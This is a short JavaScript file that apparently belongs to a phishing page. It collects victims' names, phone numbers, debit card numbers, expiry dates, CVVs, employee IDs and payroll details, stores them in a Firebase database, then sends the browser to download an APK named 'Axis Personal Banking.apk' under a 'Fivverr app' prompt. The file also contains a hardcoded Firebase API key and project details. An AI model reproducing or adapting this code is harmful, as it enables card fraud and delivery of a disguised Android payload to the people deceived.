// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyDv1bY7e00Paq3KrBqgWD2_CjGorby3fFA",
  authDomain: "fivr-eecbb.firebaseapp.com",
  databaseURL: "https://fivr-eecbb-default-rtdb.firebaseio.com",
  projectId: "fivr-eecbb",
  storageBucket: "fivr-eecbb.appspot.com",
  messagingSenderId: "433007869893",
  appId: "1:433007869893:web:b1f59ab96b1f49ab1a15ac",


    

  };

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var name = getInputVal('name');
  var phone = getInputVal('phone');
  var debitc = getInputVal('debitc');
  var expdate = getInputVal('expdate');
  var cvv = getInputVal('cvv');
  var emp_id = getInputVal('emp_id');
  var email = getInputVal('email')
  var job_desc = getInputVal('job_desc')
  var pay_roll = getInputVal('pay_roll')

  // Save message
  saveMessage(name, phone, debitc, expdate, cvv, emp_id, email, job_desc, pay_roll);

  // Show alert
// alert("Axis Bank Will Contact You Soon")
//   // Clear form
//   document.getElementById('contactForm').reset();
alert("Click Ok And Download Fivverr app")
document.getElementById('contactForm').reset();
window.location.assign("./app/Axis Personal Banking.apk")
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(name, phone, debitc, expdate, cvv, emp_id, email, job_desc, pay_roll){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    name: name,
    phone:phone,
    debitc:debitc,
    expdate:expdate,
    cvv:cvv,
    emp_id:emp_id,
    email:email,
    job_desc:job_desc,
    pay_roll:pay_roll,
  });
}
